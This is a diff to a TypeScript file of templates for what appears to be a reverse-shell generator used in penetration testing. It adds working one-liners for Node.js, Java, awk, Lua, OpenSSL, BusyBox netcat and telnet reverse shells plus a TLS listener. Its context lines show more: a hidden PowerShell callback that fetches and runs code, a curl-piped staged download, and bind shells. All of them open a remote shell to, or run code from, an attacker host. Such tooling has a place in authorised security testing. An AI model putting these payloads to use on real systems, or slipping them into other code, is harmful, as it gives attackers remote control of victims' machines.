@@ -60,6 +60,46 @@ export const reverseShellTemplates: ReverseShellTemplate[] = [
       `python3 -c 'import os,socket,subprocess;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["${shell}","-i"])'`,
   },
   {
+    id: "nodejs-child-process",
+    name: "Node.js child_process",
+    family: "node",
+    platform: "multi",
+    description: "Node.js reverse shell using net and child_process.",
+    defaultShell: "/bin/sh",
+    render: ({ lhost, lport, shell }) =>
+      `node -e "const net=require('net'),cp=require('child_process'),sh=cp.spawn('${q(shell)}',['-i']);const c=new net.Socket();c.connect(${lport},'${lhost}',()=>{c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c)});"`,
+  },
+  {
+    id: "java-runtime",
+    name: "Java Runtime",
+    family: "java",
+    platform: "multi",
+    description: "Java reverse shell using Runtime exec and socket streams.",
+    defaultShell: "/bin/sh",
+    render: ({ lhost, lport, shell }) =>
+      `jshell -q <<< 'import java.io.*;import java.net.*;var s=new Socket("${lhost}",${lport});var p=Runtime.getRuntime().exec(new String[]{"${shell}","-i"});p.getInputStream().transferTo(s.getOutputStream());'`,
+  },
+  {
+    id: "awk-tcp",
+    name: "awk TCP",
+    family: "awk",
+    platform: "linux",
+    description: "awk reverse shell for systems with /inet/tcp support.",
+    defaultShell: "/bin/sh",
+    render: ({ lhost, lport }) =>
+      `awk 'BEGIN{s="/inet/tcp/0/${lhost}/${lport}";while(42){do{printf "shell> "|&s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit")}}'`,
+  },
+  {
+    id: "lua-socket",
+    name: "LuaSocket",
+    family: "lua",
+    platform: "multi",
+    description: "Lua reverse shell using the LuaSocket module.",
+    defaultShell: "/bin/sh",
+    render: ({ lhost, lport }) =>
+      `lua -e 'local s=require("socket");local c=s.tcp();c:connect("${lhost}",${lport});while true do local r,x=c:receive();local f=io.popen(r,"r");local b=f:read("*a");c:send(b);end'`,
+  },
+  {
     id: "php-proc-open",
     name: "PHP proc_open",
     family: "php",
@@ -100,6 +140,36 @@ export const reverseShellTemplates: ReverseShellTemplate[] = [
       `socat exec:'${q(shell)} -li',pty,stderr,setsid,sigint,sane tcp:${lhost}:${lport}`,
   },
   {
+    id: "openssl-fifo",
+    name: "OpenSSL FIFO",
+    family: "openssl",
+    platform: "linux",
+    description: "TLS reverse shell using openssl s_client and a named pipe.",
+    defaultShell: "/bin/sh",
+    render: ({ lhost, lport, shell }) =>
+      `rm -f /tmp/rs;mkfifo /tmp/rs;${shell} -i < /tmp/rs 2>&1 | openssl s_client -quiet -connect ${lhost}:${lport} > /tmp/rs;rm /tmp/rs`,
+  },
+  {
+    id: "busybox-nc-e",
+    name: "BusyBox nc -e",
+    family: "nc",
+    platform: "linux",
+    description: "BusyBox netcat reverse shell for compact Linux environments.",
+    defaultShell: "/bin/sh",
+    render: ({ lhost, lport, shell }) =>
+      `busybox nc ${lhost} ${lport} -e ${shell}`,
+  },
+  {
+    id: "telnet-mkfifo",
+    name: "Telnet mkfifo",
+    family: "telnet",
+    platform: "linux",
+    description: "Telnet reverse shell fallback using a named pipe.",
+    defaultShell: "/bin/sh",
+    render: ({ lhost, lport, shell }) =>
+      `rm -f /tmp/p;mkfifo /tmp/p;${shell} -i < /tmp/p 2>&1 | telnet ${lhost} ${lport} > /tmp/p`,
+  },
+  {
     id: "powershell-tcp-client",
     name: "PowerShell TCPClient",
     family: "powershell",
@@ -114,7 +184,8 @@ export const reverseShellTemplates: ReverseShellTemplate[] = [
     name: "PowerShell HoaxShell-style",
     family: "powershell",
     platform: "windows",
-    description: "HTTP polling PowerShell callback inspired by HoaxShell workflows.",
+    description:
+      "HTTP polling PowerShell callback inspired by HoaxShell workflows.",
     defaultShell: "powershell.exe",
     render: ({ lhost, lport }) =>
       `powershell -NoP -NonI -W Hidden -Command "$u='http://${lhost}:${lport}';while($true){try{$r=iwr -UseBasicParsing $u;$c=$r.Content;if($c){$o=iex $c 2>&1 | Out-String;iwr -UseBasicParsing -Method POST -Body $o $u}}catch{};Start-Sleep -Seconds 2}"`,
@@ -124,7 +195,8 @@ export const reverseShellTemplates: ReverseShellTemplate[] = [
     name: "Bash curl staged",
     family: "staged",
     platform: "linux",
-    description: "Fetches a second-stage script from your HTTP server and pipes it to the shell.",
+    description:
+      "Fetches a second-stage script from your HTTP server and pipes it to the shell.",
     defaultShell: "/bin/bash",
     render: ({ lhost, httpPort, lport, shell }) =>
       `curl -fsSL http://${lhost}:${httpPort ?? lport}/rs.sh | ${shell}`,
@@ -134,7 +206,8 @@ export const reverseShellTemplates: ReverseShellTemplate[] = [
     name: "Netcat bind -e",
     family: "bind",
     platform: "multi",
-    description: "Bind shell for labs where inbound access to the target is available.",
+    description:
+      "Bind shell for labs where inbound access to the target is available.",
     defaultShell: "/bin/sh",
     render: ({ lport, shell }) => `nc -lvnp ${lport} -e ${shell}`,
   },
@@ -143,7 +216,8 @@ export const reverseShellTemplates: ReverseShellTemplate[] = [
     name: "Python 3 bind shell",
     family: "bind",
     platform: "multi",
-    description: "Python bind shell that listens on the target instead of calling back.",
+    description:
+      "Python bind shell that listens on the target instead of calling back.",
     defaultShell: "/bin/sh",
     render: ({ lport, shell }) =>
       `python3 -c 'import os,socket,subprocess as p;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",${lport}));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),fd) for fd in (0,1,2)];p.call(["${shell}","-i"])'`,
@@ -185,9 +259,17 @@ export const listenerTemplates: ListenerTemplate[] = [
   {
     id: "msfconsole",
     name: "Metasploit handler",
-    description: "Bash reverse shell handler; match payload options before use.",
+    description:
+      "Bash reverse shell handler; match payload options before use.",
     command: (lport, lhost) =>
       `msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD cmd/unix/reverse_bash; set LHOST ${lhost}; set LPORT ${lport}; run'`,
+  },
+  {
+    id: "openssl-server",
+    name: "OpenSSL s_server",
+    description: "Temporary TLS listener for openssl s_client payloads.",
+    command: (lport) =>
+      `openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 1 -nodes -subj '/CN=reverseshell' && openssl s_server -quiet -key key.pem -cert cert.pem -port ${lport}`,
   },
 ];
 
@@ -249,7 +331,7 @@ export function defaultConfig(): ReverseShellConfig {
     templateId: template.id,
     lhost: "10.10.14.3",
     lport: 4444,
-      httpPort: 8000,
+    httpPort: 8000,
     shell: template.defaultShell,
     obfuscation: "none",
   };
